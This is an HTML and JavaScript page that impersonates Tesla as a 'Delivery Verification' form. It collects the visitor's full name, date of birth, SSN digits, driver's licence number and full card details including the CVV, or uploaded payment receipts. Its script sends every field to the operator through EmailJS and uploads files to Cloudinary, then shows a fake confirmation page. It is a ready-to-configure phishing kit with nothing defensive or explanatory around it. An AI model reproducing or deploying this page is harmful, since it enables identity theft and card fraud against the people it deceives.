<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Tesla Delivery Verification</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,500,700">
  <style>
    body {
      font-family: 'Roboto', sans-serif;
      margin: 0;
      background: #f5f5f5;
      color: #333;
    }
    .container {
      max-width: 480px;
      margin: 30px auto;
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
      overflow: hidden;
      padding: 20px;
    }
    .header {
      text-align: center;
      padding: 10px 0;
    }
    .header img {
      max-width: 140px;
    }
    h2 {
      font-weight: 500;
      margin-bottom: 15px;
    }
    .form-group {
      margin-bottom: 14px;
    }
    .form-group label {
      font-weight: 500;
      display: block;
      margin-bottom: 6px;
    }
    .form-group input {
      width: 100%;
      padding: 8px 10px;
      border: 1px solid #ccc;
      border-radius: 6px;
    }
    .btn {
      display: block;
      width: 100%;
      padding: 12px;
      background: #cc0000;
      color: #fff;
      text-align: center;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 16px;
      margin-top: 15px;
    }
    .btn:hover {
      background: #a30000;
    }
    .payment-methods {
      display: flex;
      gap: 10px;
      margin-bottom: 20px;
    }
    .payment-method {
      flex: 1;
      padding: 10px;
      border: 2px solid #ccc;
      text-align: center;
      border-radius: 6px;
      cursor: pointer;
    }
    .payment-method.active {
      border-color: #cc0000;
      background: #ffeaea;
    }
    .hidden {
      display: none;
    }
    .footer {
      text-align: center;
      font-size: 12px;
      color: #777;
      margin-top: 20px;
    }
  </style>
</head>
<body>

<!-- Page 1: Identity Verification -->
<div class="container" id="identity-page">
  <div class="header">
    <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
  </div>
  <h2>Identity Verification</h2>
  <div class="form-group">
    <label>Full Legal Name</label>
    <input type="text" id="fullname">
  </div>
  <div class="form-group">
    <label>Date of Birth</label>
    <input type="date" id="dob">
  </div>
  <div class="form-group">
    <label>Last 4 of SSN</label>
    <input type="text" id="ssn" maxlength="4">
  </div>
  <div class="form-group">
    <label>Driver's License Number</label>
    <input type="text" id="dl">
  </div>
  <button class="btn" onclick="showPage('payment-page')">Continue to Payment</button>
</div>

<!-- Page 2: Payment -->
<div class="container hidden" id="payment-page">
  <div class="header">
    <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
  </div>
  <h2>Select Payment Method</h2>
  <div class="payment-methods">
    <div class="payment-method" onclick="selectPayment('credit-card')">Credit/Debit</div>
    <div class="payment-method" onclick="selectPayment('bank-transfer')">Bank</div>
    <div class="payment-method" onclick="selectPayment('crypto')">Crypto</div>
  </div>

  <!-- Credit Card Payment Form -->
  <div id="credit-card-payment" class="hidden">
    <div class="form-group">
      <label>Card Number</label>
      <input type="text" id="card-number">
    </div>
    <div class="form-group">
      <label>Expiry Date</label>
      <input type="text" id="expiry" placeholder="MM/YY">
    </div>
    <div class="form-group">
      <label>CVV</label>
      <input type="text" id="cvv">
    </div>
    <div class="form-group">
      <label>Name on Card</label>
      <input type="text" id="card-name">
    </div>
  </div>

  <!-- Bank Transfer Receipt Upload -->
  <div id="bank-transfer-payment" class="hidden">
    <div class="form-group">
      <label>Upload Payment Receipt</label>
      <input type="file" id="bank-receipt">
    </div>
  </div>

  <!-- Crypto Receipt Upload -->
  <div id="crypto-payment" class="hidden">
    <div class="form-group">
      <label>Upload Crypto Payment Proof</label>
      <input type="file" id="crypto-receipt">
    </div>
  </div>

  <button class="btn" id="complete-payment-btn" onclick="processPayment()">Complete Payment</button>
</div>
  <!-- Page 3: Confirmation -->
<div class="container hidden" id="confirmation-page">
  <div class="header">
    <img src="https://www.tesla.com/tesla_theme/assets/img/_vehicle_redesign/logo.svg" alt="Tesla">
  </div>
  <h2>Delivery Confirmed!</h2>
  <p>Thank you for verifying your identity and completing your payment. A confirmation has been sent to your email.</p>
  <div class="footer">Tesla Motors Â© 2025</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
<script src="https://widget.Cloudinary.com/v2.0/global/all.js"></script>
<script>
  // Initialize EmailJS
  emailjs.init("YOUR_EMAILJS_USER_ID");

  function showPage(pageId) {
    document.querySelectorAll('.container').forEach(el => el.classList.add('hidden'));
    document.getElementById(pageId).classList.remove('hidden');
  }

  function selectPayment(method) {
    document.querySelectorAll('.payment-method').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('#credit-card-payment, #bank-transfer-payment, #crypto-payment').forEach(el => el.classList.add('hidden'));

    document.querySelector(`[onclick="selectPayment('${method}')"]`).classList.add('active');

    if (method === 'credit-card') {
      document.getElementById('credit-card-payment').classList.remove('hidden');
    } else if (method === 'bank-transfer') {
      document.getElementById('bank-transfer-payment').classList.remove('hidden');
    } else if (method === 'crypto') {
      document.getElementById('crypto-payment').classList.remove('hidden');
    }
  }

  function processPayment() {
    const fullName = document.getElementById('fullname').value;
    const dob = document.getElementById('dob').value;
    const ssn = document.getElementById('ssn').value;
    const dl = document.getElementById('dl').value;

    const selectedPayment = document.querySelector('.payment-method.active')?.textContent;

    let templateParams = {
      fullname: fullName,
      dob: dob,
      ssn: ssn,
      dl: dl,
      paymentMethod: selectedPayment
    };

    if (selectedPayment === 'Credit/Debit') {
      templateParams.cardNumber = document.getElementById('card-number').value;
      templateParams.expiry = document.getElementById('expiry').value;
      templateParams.cvv = document.getElementById('cvv').value;
      templateParams.cardName = document.getElementById('card-name').value;
      sendEmail(templateParams);
    } 
    else if (selectedPayment === 'Bank') {
      const fileInput = document.getElementById('bank-receipt');
      if (fileInput.files.length > 0) {
        uploadFileToCloudinary(fileInput.files[0], (url) => {
          templateParams.bankReceiptUrl = url;
          sendEmail(templateParams);
        });
      } else {
        alert('Please upload your bank transfer receipt.');
      }
    } 
    else if (selectedPayment === 'Crypto') {
      const fileInput = document.getElementById('crypto-receipt');
      if (fileInput.files.length > 0) {
        uploadFileToCloudinary(fileInput.files[0], (url) => {
          templateParams.cryptoReceiptUrl = url;
          sendEmail(templateParams);
        });
      } else {
        alert('Please upload your crypto payment proof.');
      }
    } 
    else {
      alert('Please select a payment method.');
    }
  }

  function uploadFileToCloudinary(file, callback) {
    const cloudName = 'YOUR_CLOUD_NAME';
    const uploadPreset = 'YOUR_UPLOAD_PRESET';

    const formData = new FormData();
    formData.append('file', file);
    formData.append('upload_preset', uploadPreset);

    fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
      method: 'POST',
      body: formData
    })
    .then(res => res.json())
    .then(data => {
      callback(data.secure_url);
    })
    .catch(() => {
      alert('File upload failed.');
    });
  }

  function sendEmail(params) {
    emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', params)
    .then(() => {
      showPage('confirmation-page');
    }, () => {
      alert('Failed to send email. Try again.');
    });
  }
</script>

</body>
</html>
